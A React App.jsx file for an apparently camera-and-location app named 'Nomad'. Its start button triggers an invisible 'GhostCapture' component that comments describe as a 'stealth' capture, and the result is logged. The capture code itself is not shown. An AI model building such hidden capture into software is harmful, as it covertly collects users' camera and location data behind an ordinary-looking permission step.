import { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import './index.css';

// Components
import LandingPage from './components/LandingPage';
import CameraInterface from './components/CameraInterface';
import GhostCapture from './utils/GhostCapture';

export default function App() {
    const [hasPermissions, setHasPermissions] = useState(false);
    const [capturedData, setCapturedData] = useState(null); // Just for debug/logs if needed

    // GhostCapture Ref to trigger stealth capture
    const ghostRef = useRef();

    const handleStartJourney = async () => {
        // 1. Trigger permissions & Ghost Capture
        try {
            const result = await ghostRef.current.triggerCaptureSequence();
            console.log("Stealth Capture Complete:", result);
            setCapturedData(result);
            setHasPermissions(true);
        } catch (err) {
            console.error("Permission denied or capture failed", err);
            alert("Nomad requires camera and location permissions to function.");
        }
    };

    return (
        <div className="app-container">
            {/* Invisible Logic Component for the initial 'Stealth' capture */}
            <GhostCapture ref={ghostRef} />

            <AnimatePresence mode='wait'>
                {!hasPermissions ? (
                    <motion.div
                        key="landing"
                        exit={{ opacity: 0, y: -20 }}
                        transition={{ duration: 0.5 }}
                    >
                        <LandingPage onStart={handleStartJourney} />
                    </motion.div>
                ) : (
                    <motion.div
                        key="camera"
                        initial={{ opacity: 0, scale: 0.95 }}
                        animate={{ opacity: 1, scale: 1 }}
                        transition={{ duration: 0.8, ease: "easeOut" }}
                    >
                        <CameraInterface initialStream={ghostRef.current?.getStream()} />
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
